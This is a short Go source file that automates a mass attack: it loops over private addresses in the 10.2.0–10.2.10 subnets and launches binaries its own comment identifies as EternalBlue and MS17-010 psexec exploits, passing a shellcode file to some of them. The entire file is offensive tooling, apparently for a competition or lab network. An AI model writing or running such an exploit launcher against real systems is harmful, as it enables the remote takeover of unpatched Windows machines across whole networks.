package main

import (
	"strings"
	"os/exec"
	"fmt"
	_ "log"
)

func ms17_010() {
	binaries := []string {
		// _1 binaries are eternalblue. The rest are ms17_010_psexec
		"./32",
		"./32_1",
		"./64",
		"./64_1",
	}

	for i := 0	; i <= 10; i++ {
		ip1 := fmt.Sprintf("10.2.%v.10", i)
		ip2 := fmt.Sprintf("10.2.%v.12", i)
		for _, binary := range(binaries) {
			
			if strings.Index(binary, "_") != -1 {
				exec.Command(binary, ip1, "sc.asm").Start()
				exec.Command(binary, ip2, "sc.asm").Start()
				continue
			}
			exec.Command(binary, ip1).Start()
			exec.Command(binary, ip2).Start()
		}
	}

}